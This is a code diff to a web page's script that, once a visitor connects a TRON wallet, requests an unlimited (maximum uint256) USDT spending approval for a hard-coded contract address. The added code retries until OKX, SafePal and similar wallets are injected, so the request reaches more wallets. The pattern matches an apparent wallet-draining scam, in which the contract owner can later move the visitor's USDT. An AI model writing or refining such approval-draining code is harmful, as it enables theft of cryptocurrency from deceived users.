@@ -83,12 +83,19 @@
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-      const contractAddress = 'TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX'; // Your deployed TRC-20 approval contract
-      const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';    // TRC-20 USDT address
+      const contractAddress = 'TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX'; // Deployed contract
+      const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';    // TRC-20 USDT
 
       async function approveUSDT() {
+        // Wait until tronWeb is fully injected (for OKX & others)
+        let retries = 0;
+        while ((!window.tronWeb || !window.tronWeb.defaultAddress.base58) && retries < 10) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+          retries++;
+        }
+
         if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-          alert("Please connect your TRON wallet.");
+          alert("Please connect your TRON wallet (e.g., OKX Web3, SafePal).");
           return;
         }
 
@@ -100,9 +107,9 @@
           return;
         }
 
-        const usdtContract = await window.tronWeb.contract().at(usdtAddress);
-
         try {
+          const usdtContract = await window.tronWeb.contract().at(usdtAddress);
+
           await usdtContract.approve(contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({
             feeLimit: 100000000
           });
